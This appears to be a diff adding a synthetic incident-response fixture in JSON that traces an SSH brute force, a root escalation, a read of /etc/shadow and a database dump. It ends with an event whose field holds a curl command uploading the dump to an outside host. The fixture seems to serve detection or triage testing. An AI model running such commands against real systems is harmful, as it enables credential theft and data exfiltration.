@@ -1,0 +1,127 @@
+{
+  "incident_id": "INC-2026-0001",
+  "title": "Failed SSH brute force followed by unusual login, privilege escalation, and data exfiltration",
+  "created_at": "2026-08-29T10:15:00Z",
+  "initial_severity": "HIGH",
+  "entities": {
+    "hosts": [
+      "srv-prod-db01"
+    ],
+    "users": [
+      "admin_user",
+      "root"
+    ],
+    "ip_addresses": [
+      "192.168.1.105",
+      "198.51.100.42"
+    ]
+  },
+  "events": [
+    {
+      "event_id": "EVT-2001",
+      "timestamp": "2026-08-29T10:00:00Z",
+      "source": "auth.log",
+      "event_type": "ssh_login_failure",
+      "severity": "LOW",
+      "host": "srv-prod-db01",
+      "user": "root",
+      "ip_address": "192.168.1.105",
+      "raw_data": {
+        "port": 22,
+        "failure_reason": "Invalid password",
+        "attempts": 10
+      }
+    },
+    {
+      "event_id": "EVT-2002",
+      "timestamp": "2026-08-29T10:00:15Z",
+      "source": "auth.log",
+      "event_type": "ssh_login_failure",
+      "severity": "MEDIUM",
+      "host": "srv-prod-db01",
+      "user": "admin_user",
+      "ip_address": "192.168.1.105",
+      "raw_data": {
+        "port": 22,
+        "failure_reason": "Invalid password",
+        "attempts": 25
+      }
+    },
+    {
+      "event_id": "EVT-2003",
+      "timestamp": "2026-08-29T10:01:00Z",
+      "source": "auth.log",
+      "event_type": "ssh_login_success",
+      "severity": "HIGH",
+      "host": "srv-prod-db01",
+      "user": "admin_user",
+      "ip_address": "192.168.1.105",
+      "raw_data": {
+        "port": 22,
+        "auth_method": "password",
+        "session_id": "ssh-sess-8821"
+      }
+    },
+    {
+      "event_id": "EVT-2004",
+      "timestamp": "2026-08-29T10:02:30Z",
+      "source": "syslog",
+      "event_type": "privilege_escalation",
+      "severity": "HIGH",
+      "host": "srv-prod-db01",
+      "user": "admin_user",
+      "ip_address": "192.168.1.105",
+      "raw_data": {
+        "command": "sudo su",
+        "target_user": "root",
+        "terminal": "pts/1"
+      }
+    },
+    {
+      "event_id": "EVT-2005",
+      "timestamp": "2026-08-29T10:04:00Z",
+      "source": "auditd",
+      "event_type": "sensitive_resource_access",
+      "severity": "HIGH",
+      "host": "srv-prod-db01",
+      "user": "root",
+      "ip_address": "192.168.1.105",
+      "raw_data": {
+        "file_accessed": "/etc/shadow",
+        "action": "read",
+        "process": "cat"
+      }
+    },
+    {
+      "event_id": "EVT-2006",
+      "timestamp": "2026-08-29T10:05:15Z",
+      "source": "auditd",
+      "event_type": "sensitive_resource_access",
+      "severity": "HIGH",
+      "host": "srv-prod-db01",
+      "user": "root",
+      "ip_address": "192.168.1.105",
+      "raw_data": {
+        "file_accessed": "/var/backups/db_dump_production.sql",
+        "action": "read",
+        "process": "mysqldump"
+      }
+    },
+    {
+      "event_id": "EVT-2007",
+      "timestamp": "2026-08-29T10:08:00Z",
+      "source": "edr",
+      "event_type": "outbound_data_transfer",
+      "severity": "CRITICAL",
+      "host": "srv-prod-db01",
+      "user": "root",
+      "ip_address": "198.51.100.42",
+      "raw_data": {
+        "command": "curl -F file=@/var/backups/db_dump_production.sql http://198.51.100.42/upload",
+        "destination_ip": "198.51.100.42",
+        "destination_port": 80,
+        "bytes_sent": 52428800
+      }
+    }
+  ]
+}
